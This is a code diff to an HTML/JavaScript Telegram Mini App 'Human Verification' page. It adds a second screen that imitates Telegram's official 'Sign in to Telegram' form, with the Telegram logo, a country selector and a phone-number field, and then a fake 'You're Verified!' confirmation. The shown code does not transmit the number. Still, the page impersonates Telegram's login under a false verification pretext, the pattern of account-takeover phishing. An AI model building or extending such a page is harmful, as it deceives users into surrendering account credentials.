@@ -17,166 +17,245 @@
       justify-content: center;
       background: radial-gradient(ellipse at 50% 0%, #1a3a2a 0%, #0d1f16 40%, #080f0c 100%);
       padding: 24px;
+      transition: background 0.2s, color 0.2s;
     }
 
-    .card {
-      background: linear-gradient(160deg, rgba(255,255,255,0.07) 0%, rgba(255,255,255,0.03) 100%);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 24px;
-      padding: 40px 32px 36px;
-      width: 100%;
-      max-width: 360px;
-      text-align: center;
-      backdrop-filter: blur(20px);
-      box-shadow: 0 32px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-      animation: fadeUp 0.5s ease both;
-    }
+    .page { width: 100%; max-width: 360px; display: none; }
+    .page.active { display: block; animation: fadeUp 0.4s ease both; }
 
     @keyframes fadeUp {
       from { opacity: 0; transform: translateY(20px); }
       to   { opacity: 1; transform: translateY(0); }
     }
 
+    /* PAGE 1 */
+    .card {
+      background: linear-gradient(160deg, rgba(255,255,255,0.07) 0%, rgba(255,255,255,0.03) 100%);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 24px;
+      padding: 40px 32px 36px;
+      text-align: center;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 32px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+    }
+
     .icon-wrap {
-      width: 64px;
-      height: 64px;
+      width: 64px; height: 64px;
       background: linear-gradient(145deg, #3ecf6e, #27a855);
       border-radius: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      display: flex; align-items: center; justify-content: center;
       margin: 0 auto 20px;
       box-shadow: 0 8px 24px rgba(62,207,110,0.35);
-      animation: fadeUp 0.5s 0.1s ease both;
     }
 
-    .icon-wrap svg {
-      width: 32px;
-      height: 32px;
-      stroke: white;
-      stroke-width: 2.5;
-      fill: none;
-    }
+    .icon-wrap svg { width: 32px; height: 32px; stroke: white; stroke-width: 2.5; fill: none; }
 
-    .welcome {
-      color: rgba(255,255,255,0.45);
-      font-size: 14px;
-      font-weight: 500;
-      margin-bottom: 8px;
-      animation: fadeUp 0.5s 0.15s ease both;
-    }
+    .welcome { color: rgba(255,255,255,0.45); font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+    h1 { color: #3ecf6e; font-size: 26px; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 10px; }
+    .subtitle { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 32px; }
 
-    h1 {
-      color: #3ecf6e;
-      font-size: 26px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-      margin-bottom: 10px;
-      animation: fadeUp 0.5s 0.2s ease both;
-    }
-
-    .subtitle {
-      color: rgba(255,255,255,0.4);
-      font-size: 14px;
-      font-weight: 400;
-      margin-bottom: 32px;
-      animation: fadeUp 0.5s 0.25s ease both;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 16px;
+    .btn-green {
+      width: 100%; padding: 16px;
       background: linear-gradient(135deg, #3ecf6e, #27a855);
-      color: white;
-      font-family: 'DM Sans', sans-serif;
-      font-size: 16px;
-      font-weight: 600;
-      border: none;
-      border-radius: 14px;
-      cursor: pointer;
-      transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
+      color: white; font-family: 'DM Sans', sans-serif;
+      font-size: 16px; font-weight: 600;
+      border: none; border-radius: 14px; cursor: pointer;
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
       box-shadow: 0 8px 24px rgba(62,207,110,0.4);
-      animation: fadeUp 0.5s 0.3s ease both;
     }
+    .btn-green:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(62,207,110,0.5); }
+    .btn-green:active { transform: scale(0.98); }
+    .btn-green:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 32px rgba(62,207,110,0.5);
-    }
-
-    .btn:active {
-      transform: scale(0.98);
-      opacity: 0.9;
-    }
-
-    .btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .success {
-      display: none;
+    /* PAGE 2 - Telegram sign-in style */
+    .signin-card {
+      width: 340px;
+      display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 12px;
-      animation: fadeUp 0.4s ease both;
     }
 
-    .success svg {
-      width: 48px;
-      height: 48px;
-      stroke: #3ecf6e;
-      stroke-width: 2.5;
-      fill: none;
+    .logo {
+      width: 100px; height: 100px;
+      border-radius: 50%;
+      background: #2AABEE;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 1.5rem;
     }
 
-    .success p {
-      color: rgba(255,255,255,0.6);
-      font-size: 15px;
+    .signin-card h1 { font-size: 26px; font-weight: 700; color: var(--tg-text); margin-bottom: 0.6rem; text-align: center; }
+
+    .sub {
+      font-size: 14px; color: var(--tg-hint);
+      text-align: center; line-height: 1.55; margin-bottom: 2rem;
     }
+
+    .field { width: 100%; margin-bottom: 1.2rem; position: relative; }
+
+    .field label {
+      position: absolute; top: -8px; left: 10px;
+      font-size: 12px; color: var(--tg-hint);
+      background: var(--tg-bg); padding: 0 4px;
+      line-height: 1; pointer-events: none; z-index: 1;
+    }
+
+    .field select, .field input {
+      width: 100%;
+      border: 1px solid var(--tg-border);
+      border-radius: 6px;
+      padding: 13px 40px 13px 14px;
+      font-size: 15px; font-family: 'DM Sans', sans-serif;
+      color: var(--tg-text); background: var(--tg-secondary-bg);
+      outline: none; appearance: none; -webkit-appearance: none;
+      transition: border-color 0.15s;
+    }
+
+    .field input::placeholder { color: var(--tg-hint); }
+    .field select:focus, .field input:focus { border-color: var(--tg-button); }
+
+    .chevron {
+      position: absolute; right: 12px; top: 50%;
+      transform: translateY(-50%);
+      pointer-events: none; color: var(--tg-hint); font-size: 18px;
+    }
+
+    .btn-tg {
+      width: 100%; padding: 15px; border-radius: 8px; border: none;
+      background: var(--tg-button); color: var(--tg-button-text);
+      font-size: 15px; font-weight: 700; font-family: 'DM Sans', sans-serif;
+      letter-spacing: 0.06em; cursor: pointer; margin-top: 0.25rem;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .btn-tg:hover { opacity: 0.88; }
+    .btn-tg:active { transform: scale(0.98); }
+    .btn-tg:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    .qr {
+      margin-top: 1.2rem; font-size: 13px; font-weight: 600;
+      color: var(--tg-link); cursor: pointer;
+      background: none; border: none; font-family: 'DM Sans', sans-serif;
+    }
+    .qr:hover { text-decoration: underline; }
+
+    /* PAGE 3 - Success */
+    .success-icon {
+      width: 80px; height: 80px;
+      background: linear-gradient(145deg, #3ecf6e, #27a855);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 24px;
+      box-shadow: 0 8px 32px rgba(62,207,110,0.4);
+    }
+    .success-icon svg { width: 40px; height: 40px; stroke: white; stroke-width: 2.5; fill: none; }
+    .success-title { color: white; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+    .success-sub { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 28px; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="icon-wrap">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-    </div>
-    <p class="welcome" id="welcome">Welcome, <span id="username">there</span></p>
-    <h1>Human Verification</h1>
-    <p class="subtitle">Verify below to be granted entry</p>
 
-    <div id="verify-section">
-      <button class="btn" id="verifyBtn" onclick="verify()">Click here to verify</button>
+  <!-- Page 1: Welcome -->
+  <div class="page active" id="page1">
+    <div class="card">
+      <div class="icon-wrap">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <p class="welcome">Welcome, <span id="username1">there</span></p>
+      <h1>Human Verification</h1>
+      <p class="subtitle">Verify below to be granted entry</p>
+      <button class="btn-green" onclick="goToSignIn()">Click here to verify</button>
     </div>
+  </div>
 
-    <div class="success" id="success">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      <p>You're verified! You may now close this window.</p>
+  <!-- Page 2: Telegram Sign In -->
+  <div class="page" id="page2">
+    <div class="signin-card">
+      <div class="logo">
+        <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M4.5 27.5L14.8 31.4L18.8 44.2C19.1 45.1 20.2 45.4 20.9 44.7L26.7 38.9C27.4 38.2 28.4 38.2 29.1 38.8L39.9 47.1C40.7 47.7 41.9 47.3 42.2 46.3L52.5 10.3C52.8 9.2 51.7 8.2 50.6 8.6L4.4 25.4C3.2 25.8 3.3 27.1 4.5 27.5Z" fill="white"/>
+          <path d="M14.8 31.4L18.1 38.5C18.4 39.2 19.4 39.3 19.8 38.7L26.7 38.9" fill="white" opacity="0.6"/>
+          <path d="M14.8 31.4L38.2 16.8" stroke="#2AABEE" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h1>Sign in to Telegram</h1>
+      <p class="sub">Please confirm your country code<br>and enter your phone number.</p>
+
+      <div class="field">
+        <label>Country</label>
+        <select id="countrySelect">
+          <option>USA (+1)</option>
+          <option>UK (+44)</option>
+          <option>Germany (+49)</option>
+          <option>France (+33)</option>
+          <option>Switzerland (+41)</option>
+          <option>India (+91)</option>
+          <option>Brazil (+55)</option>
+          <option>Australia (+61)</option>
+        </select>
+        <span class="chevron">&#8964;</span>
+      </div>
+
+      <div class="field">
+        <label>Phone Number</label>
+        <input type="tel" id="phoneInput" placeholder="+1" />
+      </div>
+
+      <button class="btn-tg" id="nextBtn" onclick="goToSuccess()">NEXT</button>
+      <button class="qr">LOG IN BY QR CODE</button>
+    </div>
+  </div>
+
+  <!-- Page 3: Success -->
+  <div class="page" id="page3">
+    <div class="card" style="text-align:center;">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <div class="success-title">You're Verified!</div>
+      <p class="success-sub">You have been granted entry. You may now close this window.</p>
+      <button class="btn-green" onclick="window.Telegram?.WebApp?.close()">Close</button>
     </div>
   </div>
 
   <script>
-    const tg = window.Telegram?.WebApp;
-    if (tg) {
-      tg.ready();
-      tg.expand();
-      const user = tg.initDataUnsafe?.user;
-      if (user?.first_name) {
-        document.getElementById('username').textContent = user.first_name;
-      }
+    function applyTheme(params) {
+      const p = params || {};
+      const root = document.documentElement;
+      root.style.setProperty('--tg-bg',           p.bg_color           || '#ffffff');
+      root.style.setProperty('--tg-text',         p.text_color         || '#000000');
+      root.style.setProperty('--tg-hint',         p.hint_color         || '#888888');
+      root.style.setProperty('--tg-link',         p.link_color         || '#2AABEE');
+      root.style.setProperty('--tg-button',       p.button_color       || '#2AABEE');
+      root.style.setProperty('--tg-button-text',  p.button_text_color  || '#ffffff');
+      root.style.setProperty('--tg-secondary-bg', p.secondary_bg_color || '#f5f5f5');
+      root.style.setProperty('--tg-border',       p.hint_color         || '#cccccc');
     }
 
-    function verify() {
-      const btn = document.getElementById('verifyBtn');
-      btn.disabled = true;
-      btn.textContent = 'Verifying...';
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+      tg.ready(); tg.expand();
+      applyTheme(tg.themeParams);
+      tg.onEvent('themeChanged', () => applyTheme(tg.themeParams));
+    } else {
+      applyTheme({});
+    }
 
+    const user = tg?.initDataUnsafe?.user;
+    const firstName = user?.first_name || "there";
+    document.getElementById("username1").textContent = firstName;
+
+    function goToSignIn() {
+      document.getElementById("page1").classList.remove("active");
+      document.getElementById("page2").classList.add("active");
+    }
+
+    function goToSuccess() {
+      const btn = document.getElementById("nextBtn");
+      btn.disabled = true;
+      btn.textContent = "Verifying...";
       setTimeout(() => {
-        document.getElementById('verify-section').style.display = 'none';
-        const success = document.getElementById('success');
-        success.style.display = 'flex';
-        if (tg) tg.close();
+        document.getElementById("page2").classList.remove("active");
+        document.getElementById("page3").classList.add("active");
+        if (tg) setTimeout(() => tg.close(), 2000);
       }, 1200);
     }
   </script>
